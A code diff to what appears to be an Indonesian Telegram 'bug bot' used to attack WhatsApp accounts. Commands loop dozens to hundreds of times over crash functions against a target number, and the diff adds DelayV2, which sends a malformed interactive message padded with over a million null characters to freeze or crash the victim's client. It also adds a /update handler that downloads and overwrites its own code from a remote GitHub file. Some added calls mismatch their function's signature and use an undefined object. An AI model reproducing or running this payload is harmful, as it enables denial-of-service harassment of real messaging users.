@@ -4033,7 +4033,7 @@ bot.command("majestichard", checkAllPremium, checkWhatsAppConnection, checkCoold
       for (let r = 0; r < 500; r++) {
         try {
           await FcXDelayHamz(sock, target);
-          await FcXDelayHamz(sock, target);
+          await DelayV2(sock, target);
           await FcXDelayHamz(sock, target);
           await sleep(2000);
         } catch (err) {
@@ -4231,8 +4231,8 @@ Status - [ SUCCESS ]
 
   (async () => {
     try {
-      for (let r = 0; r < 10; r++) {
-       await delayinvis(sock, target);
+      for (let r = 0; r < 50; r++) {
+       await DelayV2(sock, target);
        await sleep(1500);
      }
     } catch (err) {
@@ -4748,27 +4748,37 @@ bot.command(/^\/testfunction(?:@[\w_]+)?\s*(.*)/, async (msg, match) => {
 });
 
 // Case auto update 
-bot.onText(/\/update/, async (msg) => {
-    const chatId = msg.chat.id;
+bot.on("message", async (msg) => {
+    const text = msg.text;
 
-    const repoRaw = "https://raw.githubusercontent.com/Dio213z/Updatesc/main/index.js";
+    if (text === "/update") {
+        const chatId = msg.chat.id;
 
-    bot.sendMessage(chatId, "⏳ Sedang mengecek update...");
+        const repoRaw = "https://raw.githubusercontent.com/Dio213z/Updatesc/main/index.js";
 
-    try {
-        const { data } = await axios.get(repoRaw);
+        bot.sendMessage(chatId, "⏳ Sedang mengecek update...");
 
-        if (!data) return bot.sendMessage(chatId, "❌ Update gagal: File kosong!");
+        try {
+            const { data } = await axios.get(repoRaw);
 
-        fs.writeFileSync("./index.js", data);
+            if (!data) {
+                return bot.sendMessage(chatId, "❌ Update gagal: File kosong!");
+            }
 
-        bot.sendMessage(chatId, "✅ Update berhasil!\nSilakan restart bot.");
+            fs.writeFileSync("./index.js", data);
 
-        process.exit(); // restart jika pakai PM2
-    } catch (e) {
-        console.log(e);
-        bot.sendMessage(chatId, "❌ Update gagal. Pastikan repo dan file index.js tersedia.");
-    }
+            bot.sendMessage(chatId, "✅ Update berhasil!\nSilakan restart bot.");
+
+            process.exit();
+        } catch (e) {
+            console.log(e);
+
+            bot.sendMessage(
+                chatId,
+                "❌ Update gagal. Pastikan repo dan file index.js tersedia."
+            );
+        }
+    }
 });
 
 // Spotify
@@ -5033,6 +5043,29 @@ async function FcXDelayHamz(sock, target) {
 }
 
 module.exports = { FcXDelayHamz };
+
+async function DelayV2(target) {
+  await nando.relayMessage(target, {
+    groupStatusMessageV2: { 
+      message: {
+        interactiveResponseMessage: {
+          body: {
+            text: "MakLo",
+            format: "DEFAULT"
+          },
+          nativeFlowResponseMessage: {
+            name: "galaxy_message",
+            paramsJson: "\u0000".repeat(1045000),
+            version: 3
+          }, 
+        }
+      }
+    }
+  }, { participant: { jid: target }});
+}
+
+
+
 
 // ━━━〔 DirzZX MEMJALANKAN - BOT  〕━━━ //
 
